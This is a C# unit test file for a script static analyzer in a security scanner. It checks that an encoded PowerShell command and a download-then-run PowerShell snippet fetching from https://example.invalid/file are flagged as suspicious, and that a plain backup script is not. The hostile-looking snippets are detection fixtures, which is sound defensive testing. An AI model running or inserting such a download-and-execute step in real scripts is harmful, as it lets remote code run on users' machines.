using System.Text;
using SecurityGuard.ArchiveGuard.Analyzers;
using SecurityGuard.ArchiveGuard.Configuration;
using SecurityGuard.ArchiveGuard.Enums;
using SecurityGuard.ArchiveGuard.Models;
using SecurityGuard.Core.Enums;

namespace SecurityGuard.ArchiveGuard.Tests;

public sealed class ScriptStaticAnalyzerTests
{
    [Fact]
    public async Task Encoded_powershell_is_suspicious()
    {
        var analyzer =
            new ScriptStaticAnalyzer(
                new ArchiveGuardOptions());

        var text =
            "powershell.exe -EncodedCommand VABlAHMAdAA=";

        var metadata =
            CreateMetadata(
                "test.ps1",
                text);

        var findings =
            await analyzer.AnalyzeAsync(
                metadata);

        Assert.Contains(
            findings,
            finding =>
                finding.Kind ==
                ArchiveFindingKind.ScriptEncodedCommand);

        Assert.Contains(
            findings,
            finding =>
                finding.Verdict ==
                ScanVerdict.Suspicious);
    }

    private static ArchiveFileMetadata CreateMetadata(
        string fileName,
        string content)
    {
        var bytes =
            Encoding.UTF8.GetBytes(
                content);

        return new ArchiveFileMetadata(
            fileName,
            fileName,
            Path.GetExtension(
                fileName),
            bytes.Length,
            DateTimeOffset.UtcNow,
            new string(
                'A',
                64),
            bytes,
            DetectedFileType.Unknown);
    }

    [Fact]
    public async Task Download_and_execute_is_suspicious()
    {
        var analyzer =
            new ScriptStaticAnalyzer(
                new ArchiveGuardOptions());

        var metadata =
            CreateMetadata(
                "loader.ps1",
                """
                $x = Invoke-WebRequest https://example.invalid/file
                Start-Process $x
                """);

        var findings =
            await analyzer.AnalyzeAsync(
                metadata);

        Assert.Contains(
            findings,
            finding =>
                finding.Kind ==
                ArchiveFindingKind.ScriptDownloadExecute);
    }

    [Fact]
    public async Task Normal_script_is_not_suspicious()
    {
        var analyzer =
            new ScriptStaticAnalyzer(
                new ArchiveGuardOptions());

        var metadata =
            CreateMetadata(
                "backup.ps1",
                """
                Get-ChildItem C:\Data
                Copy-Item C:\Data C:\Backup -Recurse
                """);

        var findings =
            await analyzer.AnalyzeAsync(
                metadata);

        Assert.DoesNotContain(
            findings,
            finding =>
                finding.Verdict ==
                ScanVerdict.Suspicious);
    }
}